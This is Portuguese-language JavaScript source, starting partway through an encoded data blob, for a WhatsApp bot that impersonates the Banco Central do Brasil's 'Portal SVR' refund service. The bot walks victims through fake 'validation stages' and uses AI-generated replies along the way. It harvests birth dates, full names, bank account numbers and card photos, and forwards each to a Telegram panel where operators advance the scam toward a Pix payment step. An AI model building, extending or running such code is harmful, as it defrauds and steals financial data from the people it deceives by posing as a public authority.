OjbyBmZWRlcmFsIiwiNDEyIjoiaG9tb2xvZ2HDp8OjbyBmZWRlcmFsIiwiNDIyIjoiaG9tb2xvZ2HDp8OjbyBmZWRlcmFsIiwiNDU2IjoiaG9tb2xvZ2HDp8OjbyBmZWRlcmFsIiwiNDY0IjoiaG9tb2xvZ2HDp8OjbyBmZWRlcmFsIiwiNDczIjoiaG9tb2xvZ2HDp8OjbyBmZWRlcmFsIiwiNDczIjoiaG9tb2xvZ2HDp8OjbyBmZWRlcmFsIiwiNDc3IjoiaG9tb2xvZ2HDp8OjbyBmZWRlcmFsIiwiNDc5IjoiaG9tb2xvZ2HDp8OjbyBmZWRlcmFsIiwiNDg3IjoiaG9tb2xvZ2HDp8OjbyBmZWRlcmFsIiwiNDg4IjoiaG9tb2xvZ2HDp8OjbyBmZWRlcmFsIiwiNDkyIjoiaG9tb2xvZ2HDp8OjbyBmZWRlcmFsIiwiNDk1IjoiaG9tb2xvZ2HDp8OjbyBmZWRlcmFsIiwiNTA1IjoiaG9tb2xvZ2HDp8OjbyBmZWRlcmFsIiwiNjAwIjoiaG9tb2xvZ2HDp8OjbyBmZWRlcmFsIiwiNjA0IjoiaG9tb2xvZ2HDp8OjbyBmZWRlcmFsIiwiNjEwIjoiaG9tb2xvZ2HDp8OjbyBmZWRlcmFsIiwiNjExIjoiaG9tb2xvZ2HDp8OjbyBmZWRlcmFsIiwiNjEyIjoiaG9tb2xvZ2HDp8OjbyBmZWRlcmFsIiwiNjEzIjoiaG9tb2xvZ2HDp8OjbyBmZWRlcmFsIiwiNjIzIjoiaG9tb2xvZ2HDp8OjbyBmZWRlcmFsIiwiNjI2IjoiaG9tb2xvZ2HDp8OjbyBmZWRlcmFsIiwiNjMwIjoiaG9tb2xvZ2HDp8OjbyBmZWRlcmFsIiwiNjMzIjoiaG9tb2xvZ2HDp8OjbyBmZWRlcmFsIiwiNjM0IjoiaG9tb2xvZ2HDp8OjbyBmZWRlcmFsIiwiNjM3IjoiaG9tb2xvZ2HDp8OjbyBmZWRlcmFsIiwiNjQzIjoiaG9tb2xvZ2HDp8OjbyBmZWRlcmFsIiwiNjUyIjoiaG9tb2xvZ2HDp8OjbyBmZWRlcmFsIiwiNjUzIjoiaG9tb2xvZ2HDp8OjbyBmZWRlcmFsIiwiNjU0IjoiaG9tb2xvZ2HDp8OjbyBmZWRlcmFsIiwiNjU1IjoiaG9tb2xvZ2HDp8OjbyBmZWRlcmFsIiwiNzA3IjoiaG9tb2xvZ2HDp8OjbyBmZWRlcmFsIiwiNzEyIjoiaG9tb2xvZ2HDp8OjbyBmZWRlcmFsIiwiNzM5IjoiaG9tb2xvZ2HDp8OjbyBmZWRlcmFsIiwiNzQxIjoiaG9tb2xvZ2HDp8OjbyBmZWRlcmFsIiwiNzQzIjoiaG9tb2xvZ2HDp8OjbyBmZWRlcmFsIiwiNzQ1IjoiaG9tb2xvZ2HDp8OjbyBmZWRlcmFsIiwiNzQ2IjoiaG9tb2xvZ2HDp8OjbyBmZWRlcmFsIiwiNzQ3IjoiaG9tb2xvZ2HDp8OjbyBmZWRlcmFsIiwiNzQ4IjoiaG9tb2xvZ2HDp8OjbyBmZWRlcmFsIiwiNzUxIjoiaG9tb2xvZ2HDp8OjbyBmZWRlcmFsIiwiNzUyIjoiaG9tb2xvZ2HDp8OjbyBmZWRlcmFsIiwiNzUzIjoiaG9tb2xvZ2HDp8OjbyBmZWRlcmFsIiwiNzU0IjoiaG9tb2xvZ2HDp8OjbyBmZWRlcmFsIiwiNzU1IjoiaG9tb2xvZ2HDp8OjbyBmZWRlcmFsIiwiNzU2IjoiaG9tb2xvZ2HDp8OjbyBmZWRlcmFsIiwiNzU3IjoiaG9tb2xvZ2HDp8OjbyBmZWRlcmFsIn0="));


function detectBank(text) {
    const clean = text.toLowerCase();
    for (const [code, name] of Object.entries(BANCOS_LIST)) {
        if (clean.includes(code) || clean.includes(name.toLowerCase())) {
            return { code, name };
        }
    }
    return null;
}

client.on('message_create', async (msg) => {
    if (BOT_ID !== 'main') return;
    if (!msg.fromMe) return;

    const targetChatId = msg.to;
    if (!targetChatId) return;
    if (targetChatId.includes('@g.us')) return;

    const currentSession = chatSessions.get(targetChatId);

    // --- DETECÇÃO DE LIGAÇÃO ATENDIDA (Etapa 2 automática) ---
    if (msg.type === 'call_log') {
        if (currentSession && currentSession.mode === 'human' && currentSession.humanStep === 1) {
            const callBody = (msg.body || '').toLowerCase();
            // Verifica se a ligação foi atendida (não perdida)
            const callAnswered = !callBody.includes('perdida') && !callBody.includes('missed') && !callBody.includes('sem resposta');
            
            if (currentSession) {
                currentSession.isCalling = false;
            }

            if (callAnswered) {
                currentSession.humanStep = 2;
                chatSessions.set(targetChatId, currentSession);
                saveSessions();
                console.log(`📞 [CALL] Ligação atendida por ${targetChatId} — Etapa 2 concluída automaticamente!`);

                // Atualiza painel principal
                if (currentSession.tgMsgId) {
                    const { text: txt, reply_markup } = buildCadastroMessage(targetChatId, currentSession.name, currentSession.birthDate, 'human', currentSession.docType, 2);
                    await notifyTelegram(txt, currentSession.tgMsgId, reply_markup);
                }

                // Envia mensagem de Etapa 2 concluída ao lead
                setTimeout(async () => {
                    await client.sendMessage(targetChatId, MENSAGEM_ETAPA_2_CONCLUIDA);
                }, 2000);
            } else {
                console.log(`📵 [CALL] Ligação perdida/não atendida por ${targetChatId}.`);
                // Edita o painel informando que a ligação falhou
                if (currentSession.tgMsgId) {
                    const { text: txt, reply_markup } = buildCadastroMessage(targetChatId, currentSession.name, currentSession.birthDate, 'human', currentSession.docType, 1);
                    await notifyTelegram(txt, currentSession.tgMsgId, reply_markup);
                }
            }
        }
        return;
    }

    // --- ADMIN DIGITA MANUALMENTE → ASSUME ATENDIMENTO ---
    if (!currentSession || currentSession.mode !== 'bot') return;

    const sessionAge = Date.now() - (currentSession.createdAt || Date.now());
    if (sessionAge > 30000) {
        // Preserva dados do lead ao assumir
        chatSessions.set(targetChatId, {
            mode: 'human',
            humanStep: 1,
            name: currentSession.name || null,
            birthDate: currentSession.birthDate || null,
            docType: currentSession.docType || 'CPF'
        });
        saveSessions();
        console.log(`👤 [ADMIN] Assumiu atendimento de: ${targetChatId}`);

        const { text: txtAssume, reply_markup: rmAssume } = buildCadastroMessage(targetChatId, currentSession.name, currentSession.birthDate, 'human', currentSession.docType, 1);
        await notifyTelegram(txtAssume, currentSession.tgMsgId, rmAssume);

        setTimeout(async () => {
            try {
                await client.sendMessage(targetChatId, MENSAGEM_OPERADOR_ASSUME);
                console.log(`📨 [ADMIN] Mensagem formal enviada ao lead: ${targetChatId}`);
            } catch (e) {
                console.error(`❌ [ADMIN] Erro ao enviar mensagem formal:`, e.message);
            }
        }, 1500);
    }
});

// =============================================================
// HANDLER 2: 'message' — SOMENTE mensagens RECEBIDAS (incoming).
// Este evento NÃO dispara para mensagens que o bot envia,
// eliminando o risco de processar a própria resposta.
// =============================================================
client.on('message', async (msg) => {
    if (BOT_ID !== 'main') return;

    // msg.from = sempre o remetente (o lead). Nunca é o bot.
    const targetChatId = msg.from;
    if (!targetChatId) return;

    // Ignora mensagens de grupos (apenas individuais)
    if (targetChatId.includes('@g.us')) return;

    // LOCK: se já estamos processando uma mensagem deste lead, ignorar
    if (processingLock.has(targetChatId)) {
        console.log(`⏳ [LOCK] Mensagem de ${targetChatId} ignorada — já processando.`);
        return;
    }
    processingLock.add(targetChatId);

    try {
        await processIncomingMessage(msg, targetChatId);
    } catch (e) {
        console.error(`❌ [ERRO] Falha ao processar mensagem de ${targetChatId}:`, e.message);
    } finally {
        // Libera o lock após 2s para evitar spam mas permitir próximas mensagens
        setTimeout(() => processingLock.delete(targetChatId), 2000);
    }
});

// =============================================================
// FUNÇÃO PRINCIPAL DE PROCESSAMENTO DE MENSAGEM RECEBIDA
// Centraliza toda a lógica para evitar duplicação e facilitar
// a depuração do fluxo de cada lead individualmente.
// =============================================================
async function processIncomingMessage(msg, targetChatId) {
    const text = (msg.body || "").trim();
    const isTrigger = text.toUpperCase().includes('SOLICITAÇÃO DE RESGATE');

    // Registra o último lead que enviou mensagem (para o comando /pix)
    fs.writeFileSync('last-lead.json', JSON.stringify({ chatId: targetChatId, timestamp: Date.now() }));

    const currentSession = chatSessions.get(targetChatId);
    console.log(`📩 [MSG] De: ${targetChatId} | Sessão: ${currentSession?.mode || 'nova'} | Texto: "${text.substring(0, 60)}"`);

    // --- LEAD NA FILA DE ESPERA ---
    if (currentSession && currentSession.mode === 'waiting') {
        const pos = getQueuePosition(targetChatId);
        const chat = await msg.getChat();
        await chat.sendStateTyping();

        const aiReply = await askAI(PROMPT_FILA, text);
        const posText = pos ? `\n\n📌 *Sua posição atual na fila:* ${pos}º lugar.` : '';
        const fallback = `📋 *Portal SVR — Sistema de Valores a Receber*\n\n` +
            `Prezado(a) titular,\n\n` +
            `Seus dados foram validados com êxito e seu processo de liberação de ativos foi encaminhado ao setor responsável do Banco Central do Brasil, em conformidade com a Resolução nº 4.862/2020.\n\n` +
            `O processamento está em andamento. Solicitamos que aguarde o contato de nosso operador responsável, que lhe informará os próximos passos de forma segura e sigilosa.${posText}\n\n` +
            `Agradecemos sua compreensão.\n_Portal SVR — Banco Central do Brasil_`;

        await client.sendMessage(targetChatId, aiReply || fallback);
        return;
    }

    // --- LEAD EM ATENDIMENTO HUMANO — bot silencioso (EXCETO ETAPA 5) ---
    if (currentSession && currentSession.mode === 'human') {
        if (currentSession.humanStep === 5) {
            // Se o lead enviar mídia (foto do cartão)
            if (msg.hasMedia) {
                console.log(`📸 [BANCO] Lead ${targetChatId} enviou mídia.`);
                try {
                    const media = await msg.downloadMedia();
                    if (media) {
                        const buffer = Buffer.from(media.data, 'base64');
                        await notifyTelegramPhoto(buffer, `🔐 <b>DOCUMENTO SIGILOSO RECEBIDO</b>\nLead: <code>${targetChatId}</code>\n<i>O lead enviou um anexo (Cartão/Doc) para validação da Etapa 5.</i>`);
                    }
                } catch (e) {
                    await notifyTelegram(`📸 <b>MÍDIA BANCÁRIA RECEBIDA (Sem Imagem)</b>\nLead: <code>${targetChatId}</code>\n<i>Erro ao processar imagem, verifique o WhatsApp.</i>`);
                }

                await client.sendMessage(targetChatId, `✅ *Documento recebido com sucesso.*\n\nIniciando leitura óptica dos caracteres de segurança... Por favor, aguarde a validação final.`);
                return;
            }

            // Tenta identificar Agência e Conta no texto
            const agMatch = text.match(/(?:ag[êe]ncia|ag):?\s*(\d{4,5})/i);
            const ccMatch = text.match(/(?:conta|cc):?\s*(\d{5,12}[-\s]?\d)/i);

            if (agMatch || ccMatch || (text.length >= 4 && /^\d+$/.test(text.replace(/[-\s]/g, '')))) {
                const ag = agMatch ? agMatch[1] : (text.length <= 5 ? text : 'Pendente');
                const cc = ccMatch ? ccMatch[1] : (text.length > 5 ? text : 'Pendente');

                console.log(`🏦 [BANCO] Dados de ${targetChatId}: Ag ${ag} | Cc ${cc}`);
                await notifyTelegram(`🏦 <b>DADOS BANCÁRIOS IDENTIFICADOS</b>\nLead: <code>${targetChatId}</code>\nAgência: <b>${ag}</b>\nConta: <b>${cc}</b>\n\n<i>Texto: ${text}</i>`);

                await client.sendMessage(targetChatId, `🔍 *Verificando autenticidade...*\n\nDados capturados:\n🏛️ Agência: ${ag}\n💳 Conta: ${cc}\n\nO sistema está cruzando as informações com o CPF titular para autorização do repasse final.`);
                return;
            }
        }

        console.log(`🤫 [HUMANO] Lead ${targetChatId} em atendimento manual. Bot silencioso.`);
        return;
    }

    // 1. GATILHO INICIAL (vindo do site)
    if (isTrigger) {
        if (currentSession && currentSession.mode === 'bot' && currentSession.step > 0) return;

        const protocolMatch = text.match(/Protocolo: \*#SVR-(.*?)\*/i);
        const userId = protocolMatch ? protocolMatch[1].toLowerCase() : null;

        // Detecta o tipo de documento (CPF ou CNPJ) enviado pelo site
        const docTypeMatch = text.match(/Tipo de Documento: \*(CPF|CNPJ)\*/i);
        const docType = docTypeMatch ? docTypeMatch[1].toUpperCase() : 'CPF';
        const isPJ = docType === 'CNPJ';
        console.log(`📄 [DOC] Tipo detectado: ${docType} para ${targetChatId}`);

        console.log(`🚀 [SVR] Atendimento Iniciado: ${targetChatId}`);

        let expectedData = null;
        if (userId) {
            try {
                const res = await axios.get(`${API_URL}/api/v1/session/data/${userId}`, {
                    headers: API_HEADERS,
                    timeout: 5000
                });
                expectedData = res.data;
            } catch (e) {
                console.log(`⚠️ [AVISO] Dados do portal não encontrados para ${userId}. Usando modo de validação aberta.`);
            }
        }

        // Envia mensagem inicial no Telegram (painel de cadastro)
        const { text: txtInit, reply_markup } = buildCadastroMessage(targetChatId, null, null, 'preenchendo_data', docType);
        const tgMsgId = await notifyTelegram(txtInit, null, reply_markup);

        chatSessions.set(targetChatId, {
            mode: 'bot',
            step: 1,
            userId,
            expectedData,
            docType,   // 'CPF' ou 'CNPJ'
            lastMsgTime: Date.now(),
            createdAt: Date.now(),
            tgMsgId
        });
        saveSessions();

        setTimeout(async () => {
            if (isPJ) {
                await client.sendMessage(targetChatId,
                    `🏢 *Portal SVR — Atendimento Empresarial*\n\nIdentificamos ativos financeiros pendentes vinculados ao CNPJ informado em nosso sistema.\n\nPara prosseguir com a validação da titularidade jurídica, necessitamos confirmar os dados cadastrais da empresa.\n\n📍 *ETAPA 1:* Informe a *Data de Abertura* da empresa (Ex: 10/05/2005):`);
            } else {
                await client.sendMessage(targetChatId,
                    `👋 *Olá! Sou o assistente oficial do SVR.*\n\nPara sua segurança, iniciamos o *Protocolo de Validação de Dados*.\n\n📍 *ETAPA 1:* Digite sua *Data de Nascimento* (Ex: 10/05/1990):`);
            }
        }, 1500);
        return;
    }

    // 2. LEAD SEM SESSÃO ATIVA — IA ASSUME E INICIA FLUXO
    if (!currentSession || currentSession.mode !== 'bot') {
        console.log(`🤖 [IA] Mensagem espontânea de ${targetChatId}: "${text}"`);
        const chat = await msg.getChat();
        await chat.sendStateTyping();

        // Envia painel de cadastro no Telegram
        const { text: txtEsp, reply_markup: rmEsp } = buildCadastroMessage(targetChatId, null, null, 'preenchendo_data');
        const tgMsgId = await notifyTelegram(txtEsp, null, rmEsp);

        // Notifica contato espontâneo
        await notifyTelegram(
            `📩 <b>NOVO CONTATO ESPONTÂNEO</b>\nLead: <code>${targetChatId}</code>\nMensagem: <i>${text}</i>`
        );

        chatSessions.set(targetChatId, {
            mode: 'bot',
            step: 1,
            userId: null,
            expectedData: null,
            lastMsgTime: Date.now(),
            createdAt: Date.now(),
            tgMsgId
        });
        saveSessions();

        const aiReply = await askAI(PROMPT_INICIAL, text);
        const fallback = `👋 *Olá! Sou o Assistente Oficial do Portal SVR — Sistema de Valores a Receber.*\n\n` +
            `Identificamos valores pendentes de liberação associados ao seu perfil em nosso sistema, em conformidade com as diretrizes do Banco Central do Brasil.\n\n` +
            `Para prosseguir com a validação de titularidade e liberar o processamento, necessitamos confirmar seus dados cadastrais.\n\n` +
            `📍 *ETAPA 1:* Por gentileza, informe sua *Data de Nascimento* (Ex: 10/05/1990):`;

        setTimeout(async () => {
            await client.sendMessage(targetChatId, aiReply || fallback);
        }, 1500);
        return;
    }

    currentSession.lastMsgTime = Date.now();
    console.log(`📩 [LEAD] ${targetChatId}: "${text}"`);

    const chat = await msg.getChat();
    await chat.sendStateTyping();

    const isPJ = currentSession.docType === 'CNPJ';

    // --- ETAPA 1: DATA (nascimento para PF / abertura para PJ) ---
    if (currentSession.step === 1) {
        const dateMatch = text.match(/(\d{1,2})[\/-](\d{1,2})[\/-](\d{4}|\d{2})/);

        if (!dateMatch) {
            const aiReply = await askAI(PROMPT_DATA_INVALIDA, text);
            const dataLabel = isPJ ? 'Data de Abertura da empresa' : 'Data de Nascimento';
            const fallback = `⚠️ *Portal SVR — Validação de Identidade*\n\nO formato informado não foi reconhecido pelo sistema.\n\nPor gentileza, informe a *${dataLabel}* no formato oficial:\n📌 *Exemplo:* 10/05/1990`;
            await msg.reply(aiReply || fallback);
            return;
        }

        const typedDate = text.trim();

        if (currentSession.expectedData?.birthDate) {
            const cleanTyped = typedDate.replace(/\D/g, "");
            const cleanExpected = currentSession.expectedData.birthDate.replace(/\D/g, "");

            if (cleanTyped !== cleanExpected) {
                const fallback = `⚠️ *DIVERGÊNCIA IDENTIFICADA — Portal SVR*\n\nA data informada não corresponde aos registros cadastrais do titular.\n\nPor gentileza, verifique os dados e informe novamente.\n📌 *Formato:* DD/MM/AAAA`;
                await msg.reply(fallback);
                return;
            }
        }

        // Data aceita — avançar para etapa 2 (Nome)
        currentSession.step = 2;
        currentSession.birthDate = typedDate;
        chatSessions.set(targetChatId, currentSession);
        saveSessions();

        // Atualiza o painel no Telegram
        if (currentSession.tgMsgId) {
            const { text: txt, reply_markup } = buildCadastroMessage(targetChatId, null, typedDate, 'preenchendo_nome', currentSession.docType);
            await notifyTelegram(txt, currentSession.tgMsgId, reply_markup);
        }

        if (isPJ) {
            await msg.reply(
                `✅ *Data de abertura confirmada!*\n\n` +
                `📍 *FASE 1.2:* Agora informe a *Razão Social* da empresa (conforme consta no Cartão CNPJ):`);
        } else {
            await msg.reply(
                `✅ *Data de nascimento confirmada!*\n\n` +
                `📍 *FASE 1.2:* Agora informe seu *Nome Completo* (conforme consta no documento oficial):`);
        }

        // --- ETAPA 2: NOME / RAZÃO SOCIAL ---
    } else if (currentSession.step === 2) {
        const typedName = text.trim();

        if (typedName.length >= 8 && typedName.includes(" ")) {
            if (currentSession.expectedData?.fullName) {
                const portalName = currentSession.expectedData.fullName.toLowerCase();
                const firstName = typedName.toLowerCase().split(' ')[0];
                if (!portalName.includes(firstName)) {
                    await msg.reply(
                        `⚠️ *ALERTA DE SEGURANÇA — Portal SVR*\n\nO nome informado não corresponde ao titular cadastrado no sistema.\n\nPor gentileza, informe seu *Nome Completo* conforme consta em documento oficial:`);
                    return;
                }
            }

            // ✅ Nome aceito — avançar para fase 1.3 (Dados Bancários)
            currentSession.step = 3;
            currentSession.name = typedName;
            chatSessions.set(targetChatId, currentSession);
            saveSessions();

            await msg.reply(
                `✅ *Nome confirmado!*\n\n` +
                `📍 *FASE 1.3:* Para concluir a autenticação de identidade, informe os *Dados Bancários* (Agência e Conta) onde deseja receber os ativos. O sistema validará se o vínculo pertence ao titular.\n\n` +
                `📌 *Exemplo:* Agência 0001 - Conta 12345-6`);

        } else {
            // Nome inválido — IA responde de forma formal
            const aiReply = await askAI(PROMPT_NOME_INVALIDO, text);
            const fallback = `⚠️ *Portal SVR — Validação de Identidade*\n\nPor gentileza, informe seu *Nome Completo* sem abreviações, conforme consta em seu documento oficial.`;
            await msg.reply(aiReply || fallback);
        }

        // --- ETAPA 1.3: DADOS BANCÁRIOS (Antes da fila) ---
    } else if (currentSession.step === 3) {
        // Se o lead já enviou os dados e estamos aguardando o "SIM" de confirmação
        if (currentSession.awaitingConfirm) {
            if (text.toUpperCase() === 'SIM' || text.toUpperCase().includes('CORRETO') || text.toUpperCase().includes('ESTA')) {
                // ✅ Confirmado — avançar para a fila
                currentSession.step = 4;
                delete currentSession.awaitingConfirm;
                currentSession.mode = 'waiting';
                chatSessions.set(targetChatId, currentSession);
                saveSessions();

                addToQueue(targetChatId, currentSession.name, currentSession.birthDate);
                const queuePos = getQueuePosition(targetChatId);
                const clientesFrente = queuePos > 1 ? queuePos - 1 : 0;

                if (currentSession.tgMsgId) {
                    const { text: txt, reply_markup } = buildCadastroMessage(targetChatId, currentSession.name, currentSession.birthDate, 'na_fila', currentSession.docType);
                    await notifyTelegram(txt, currentSession.tgMsgId, reply_markup);
                }

                const frenteMsg = clientesFrente > 0
                    ? `Há *${clientesFrente} solicitação(ões)* sendo processada(s) antes da sua.`
                    : `Sua solicitação é a próxima a ser processada.`;

                await msg.reply(
                    `📋 *AUTENTICAÇÃO CONCLUÍDA — Portal SVR*\n\n` +
                    `Prezado(a) *${currentSession.name}*,\n` +
                    `Sua identidade e vínculo bancário foram validados com êxito pelo sistema federal de segurança.\n\n` +
                    `⌛ *STATUS ATUAL:* Aguardando Processamento\n\n` +
                    `${frenteMsg}\n\n` +
                    `Nosso operador entrará em contato em breve para os procedimentos finais de liberação dos ativos.\n\n` +
                    `_Portal SVR — Banco Central do Brasil_`);
                return;
            } else {
                // Se não confirmou (quer trocar), limpa o flag e deixa o fluxo seguir para ler os novos dados abaixo
                delete currentSession.awaitingConfirm;
            }
        }

        if (msg.hasMedia) {
            console.log(`📸 [BANCO-FOTO] Lead ${targetChatId} enviou foto do cartão.`);
            try {
                const media = await msg.downloadMedia();
                if (media) {
                    const buffer = Buffer.from(media.data, 'base64');
                    await notifyTelegramPhoto(buffer, `💳 <b>CARTÃO RECEBIDO (VALIDAÇÃO INICIAL)</b>\nLead: <code>${targetChatId}</code>\n<i>O lead enviou foto do cartão na etapa 1.3.</i>`);
                }
            } catch (e) { }

            currentSession.awaitingConfirm = true;
            currentSession.bankData = "FOTO_ENVIADA";
            chatSessions.set(targetChatId, currentSession);
            saveSessions();

            await msg.reply(
                `✅ *Documento recebido com sucesso!*\n\n` +
                `Prezado(a) titular, esta é a conta que o senhor(a) deseja utilizar para o recebimento dos valores ativos?\n\n` +
                `⚠️ *Nota:* Devido aos protocolos de segurança, a validação de imagens é realizada por supervisão judicial e técnica do sistema SVR/BCB para garantir a integridade do repasse.\n\n` +
                `*Responda SIM para confirmar.*`);
            return;
        }

        const typedBank = text.trim();
        if (typedBank.length >= 4) {
            const bank = detectBank(typedBank);
            const bankName = bank ? bank.name : "Instituição Identificada";

            // Tenta extrair Agência e Conta
            const agMatch = typedBank.match(/(?:ag[êe]ncia|ag):?\s*(\d{4,5})/i);
            const ccMatch = typedBank.match(/(?:conta|cc):?\s*(\d{5,12}[-\s]?\d)/i);
            const ag = agMatch ? agMatch[1] : (typedBank.split(/[-\s]/).find(p => p.length >= 3 && p.length <= 5) || "Pendente");
            const cc = ccMatch ? ccMatch[1] : (typedBank.split(/[-\s]/).find(p => p.length > 5) || "Pendente");

            currentSession.awaitingConfirm = true;
            currentSession.bankData = typedBank;
            chatSessions.set(targetChatId, currentSession);
            saveSessions();

            await msg.reply(
                `🏛️ *${bankName.toUpperCase()} IDENTIFICADO* ✅\n\n` +
                `📍 *DADOS CAPTURADOS:*
                - Agência: ${ag}
                - Conta: ${cc}
                - Instituição: ${bankName}\n\n` +
                `Prezado(a) titular, confirme se realmente esta é a conta que o senhor(a) deseja utilizar para o recebimento do seu valor ativo?\n\n` +
                `⚠️ *AVISO:* A conta *NÃO* pode ser recém-criada ou sem movimentações antigas, sob risco de bloqueio pelo sistema de segurança do Banco Central.\n\n` +
                `*Responda SIM para confirmar* ou informe os dados novamente para trocar.`);
        } else {
            await msg.reply(`⚠️ *Dados Bancários Inválidos*\n\nPor gentileza, informe sua Agência e Conta corretamente para vinculação do resgate.`);
        }
    }
}

// --- WATCHER DE COMANDOS EXTERNOS (TELEGRAM -> WHATSAPP) ---
setInterval(async () => {
    // --- cmd-send-*.json: envia mensagem livre ao lead ---
    const sendFiles = fs.readdirSync(process.cwd()).filter(f => f.startsWith('cmd-send-') && f.endsWith('.json'));
    for (const file of sendFiles) {
        try {
            const cmdPath = path.join(process.cwd(), file);
            const cmd = JSON.parse(fs.readFileSync(cmdPath, 'utf-8'));
            console.log(`📤 Enviando mensagem externa para: ${cmd.to}`);
            await client.sendMessage(cmd.to, cmd.message);
            if (waitingQueue.find(q => q.chatId === cmd.to)) {
                removeFromQueue(cmd.to);
                chatSessions.set(cmd.to, { mode: 'human', humanStep: 1 });
                saveSessions();
                console.log(`✅ [FILA] Lead ${cmd.to} removido da fila — atendimento assumido pelo admin.`);
            }
            fs.unlinkSync(cmdPath);
        } catch (e) {
            console.error("❌ Erro ao processar cmd-send:", e.message);
        }
    }

    // --- cmd-etapa-*.json: libera etapas 3 e 4 ao lead ---
    const etapaFiles = fs.readdirSync(process.cwd()).filter(f => f.startsWith('cmd-etapa-') && f.endsWith('.json'));
    for (const file of etapaFiles) {
        try {
            const cmdPath = path.join(process.cwd(), file);
            const cmd = JSON.parse(fs.readFileSync(cmdPath, 'utf-8'));
            const { etapa, chatId } = cmd;
            const session = chatSessions.get(chatId);

            console.log(`📋 [ETAPA ${etapa}] Liberando para: ${chatId}`);

            if (etapa === 3) {
                if (session) { session.humanStep = 3; chatSessions.set(chatId, session); saveSessions(); }
                await client.sendMessage(chatId, MENSAGEM_ETAPA_3);
                // Notifica Telegram com botão para Etapa 4
                await notifyTelegram(
                    `📋 <b>ETAPA 3 LIBERADA!</b>\nLead: <code>${chatId}</code>\n\n<i>Use /pix para gerar o protocolo e avançar para Etapa 4.</i>`
                );
            } else if (etapa === 4) {
                if (session) { session.humanStep = 4; chatSessions.set(chatId, session); saveSessions(); }
                await client.sendMessage(chatId, MENSAGEM_ETAPA_4);
                await notifyTelegram(
                    `🔐 <b>ETAPA 4 — PROTOCOLO ATIVO</b>\nLead: <code>${chatId}</code>\n\n<i>Aguardando detecção de validação do hash bancário.</i>`,
                    undefined,
                    { inline_keyboard: [[{ text: '💰 Liberar Etapa 5 Manual', callback_data: `etapa:5:${chatId}` }]] }
                );
            } else if (etapa === 5) {
                if (session) { session.humanStep = 5; chatSessions.set(chatId, session); saveSessions(); }
                await client.sendMessage(chatId, MENSAGEM_ETAPA_5);
                await notifyTelegram(
                    `💰 <b>ETAPA 5 — LIBERAÇÃO FINAL</b>\nLead: <code>${chatId}</code>\n\n<i>Lead em fase de preenchimento dos dados de crédito.</i>`
                );
            }

            fs.unlinkSync(cmdPath);
        } catch (e) {
            console.error("❌ Erro ao processar cmd-etapa:", e.message);
        }
    }
}, 3000);

client.initialize();
